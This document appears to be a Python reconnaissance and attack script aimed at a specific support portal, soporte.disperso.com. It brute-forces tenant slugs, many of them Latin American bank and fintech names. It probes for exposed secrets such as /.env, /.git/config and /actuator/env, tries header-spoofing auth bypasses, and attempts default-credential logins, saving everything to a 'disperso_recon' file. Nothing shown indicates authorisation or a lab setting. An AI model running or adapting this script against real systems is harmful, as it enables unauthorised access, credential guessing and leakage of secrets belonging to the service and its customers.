import requests, json, time

BASE = "https://soporte.disperso.com"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json"
}

results_slugs = []
results_endpoints = []

print("=== 1. SLUG BRUTE FORCE ===")
slugs = [
    "disperso", "test", "demo", "sandbox", "admin", "tuxpan", "default",
    "empresa", "cliente", "client", "prueba", "staging", "dev", "qa",
    "production", "prod", "main", "root", "support", "help", "helpdesk",
    "soporte", "ejemplo", "example", "company", "company1", "empresa1",
    "test1", "test2", "demo1", "internal", "public",
    # Fintech MX
    "kubo", "albo", "clip", "rappi", "mercadolibre", "oxxo", "coppel",
    "walmart", "banorte", "bbva", "hsbc", "santander", "scotiabank",
    "banamex", "inbursa", "stp", "spei",
    # Chile
    "falabella", "ripley", "lider", "mercadopago", "tenpo", "mach",
    "fintual", "bci", "banco-estado", "banco-chile", "itau", "bice",
    "transbank", "webpay", "kushki", "flow", "khipu", "fpay",
    # Peru
    "bcp", "interbank", "yape", "plin", "niubiz", "izipay",
    # Generic patterns
    "api", "app", "portal", "panel", "dashboard", "backoffice",
    "payments", "pagos", "transfer", "transferencias", "nomina",
    "payroll", "billing", "facturacion", "reembolso", "refund",
    # Company name variations
    "disperso-test", "disperso-demo", "disperso-sandbox",
    "tuxpan-software", "tuxpan-chile",
]

found_slugs = []
for slug in slugs:
    url = f"{BASE}/api/public/portal/{slug}"
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        entry = {"slug": slug, "status": r.status_code, "length": len(r.text)}
        if r.status_code == 200:
            entry["data"] = r.json()
            found_slugs.append(entry)
            print(f"  *** FOUND: {slug} -> {r.status_code} ({len(r.text)}b)")
            print(f"      Data: {json.dumps(r.json(), indent=2)[:300]}")
        elif r.status_code != 404:
            print(f"  ??? {slug} -> {r.status_code} ({len(r.text)}b)")
            entry["body"] = r.text[:200]
        results_slugs.append(entry)
    except Exception as e:
        print(f"  ERR {slug} -> {e}")
    time.sleep(0.4)

print(f"\n  Found {len(found_slugs)} valid slugs out of {len(slugs)} tested")

print("\n=== 2. KB ARTICLES FOR FOUND SLUGS ===")
for s in found_slugs:
    slug = s["slug"]
    url = f"{BASE}/api/public/portal/{slug}/articles"
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        print(f"  {slug}/articles -> {r.status_code} ({len(r.text)}b)")
        if r.status_code == 200:
            articles = r.json()
            print(f"    Articles: {json.dumps(articles, indent=2)[:1000]}")
            s["articles"] = articles
    except Exception as e:
        print(f"  ERR {slug}/articles -> {e}")
    time.sleep(0.5)

print("\n=== 3. SOPORTE API ENDPOINT DISCOVERY ===")
api_paths = [
    ("GET", "/api/tickets"), ("GET", "/api/v1/tickets"),
    ("POST", "/api/tickets"), ("POST", "/api/v1/tickets"),
    ("GET", "/api/chat"), ("GET", "/api/v1/chat"),
    ("GET", "/api/mesa"), ("GET", "/api/v1/mesa"),
    ("GET", "/api/agents"), ("GET", "/api/v1/agents"),
    ("GET", "/api/users"), ("GET", "/api/v1/users"),
    ("GET", "/api/config"), ("GET", "/api/v1/config"),
    ("GET", "/api/health"), ("GET", "/api/v1/health"),
    ("POST", "/api/auth/login"), ("POST", "/api/v1/auth/login"),
    ("POST", "/api/auth/register"), ("POST", "/api/v1/auth/register"),
    ("GET", "/api/auth/me"), ("GET", "/api/v1/auth/me"),
    ("GET", "/api/public"), ("GET", "/api/public/health"),
    ("GET", "/api/public/config"), ("GET", "/api/public/version"),
    ("GET", "/actuator"), ("GET", "/actuator/health"),
    ("GET", "/actuator/env"), ("GET", "/actuator/info"),
    ("GET", "/actuator/mappings"),
    ("GET", "/.env"), ("GET", "/robots.txt"), ("GET", "/sitemap.xml"),
    ("GET", "/.git/config"), ("GET", "/server-status"),
    ("GET", "/api/v1/company"), ("GET", "/api/v1/portal"),
    ("GET", "/api/v1/article"), ("GET", "/api/v1/articles"),
    ("GET", "/api/v1/category"), ("GET", "/api/v1/categories"),
    ("GET", "/api/v1/knowledge-base"),
    ("POST", "/api/public/ticket"), ("POST", "/api/public/tickets"),
    ("POST", "/api/public/contact"), ("POST", "/api/public/message"),
    ("POST", "/api/public/chat"), ("POST", "/api/public/feedback"),
]

for method, path in api_paths:
    url = f"{BASE}{path}"
    try:
        if method == "GET":
            r = requests.get(url, headers=HEADERS, timeout=10)
        else:
            r = requests.post(url, headers={**HEADERS, "Content-Type": "application/json"},
                            json={"email":"test@test.com","message":"test"}, timeout=10)
        
        entry = {"method": method, "path": path, "status": r.status_code, "length": len(r.text)}
        if r.status_code not in (404, 405):
            entry["body"] = r.text[:300]
            marker = "!!!" if r.status_code in (200, 201, 500) else "**" if r.status_code == 401 else ""
            print(f"  {marker} {method:5} {path:45} -> {r.status_code} ({len(r.text)}b)")
            if r.status_code in (200, 201, 500):
                print(f"        Body: {r.text[:200]}")
        results_endpoints.append(entry)
    except Exception as e:
        print(f"  ERR  {method:5} {path:45} -> {e}")
    time.sleep(0.4)

print("\n=== 4. AUTH BYPASS ATTEMPTS ===")
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/api/public/portal/test"},
    {"X-Forwarded-Host": "localhost"},
]
for bh in bypass_headers:
    hdrs = {**HEADERS, **bh}
    try:
        r = requests.get(f"{BASE}/api/tickets", headers=hdrs, timeout=10)
        print(f"  Bypass {list(bh.keys())[0]}: /api/tickets -> {r.status_code}")
    except Exception as e:
        print(f"  ERR bypass -> {e}")
    time.sleep(0.5)

login_creds = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"email": "admin@disperso.com", "password": "disperso123"},
    {"email": "soporte@disperso.com", "password": "soporte123"},
    {"email": "admin@disperso.com", "password": "admin123"},
]
for creds in login_creds:
    for login_path in ["/api/auth/login", "/api/v1/auth/login"]:
        try:
            r = requests.post(f"{BASE}{login_path}",
                            headers={**HEADERS, "Content-Type": "application/json"},
                            json=creds, timeout=10)
            if r.status_code != 404:
                print(f"  Login {login_path} {creds} -> {r.status_code} | {r.text[:200]}")
        except Exception as e:
            print(f"  ERR login -> {e}")
        time.sleep(0.5)

print("\n=== SUMMARY ===")
print(f"Valid slugs: {len(found_slugs)}")
for s in found_slugs:
    print(f"  - {s['slug']}: {json.dumps(s.get('data',{}))[:200]}")

with open("disperso_recon/soporte_enum_results.json", "w") as f:
    json.dump({"slugs": results_slugs, "found": found_slugs, "endpoints": results_endpoints}, f, indent=2)
print(f"\nSaved results ({len(results_slugs)} slugs, {len(results_endpoints)} endpoints)")
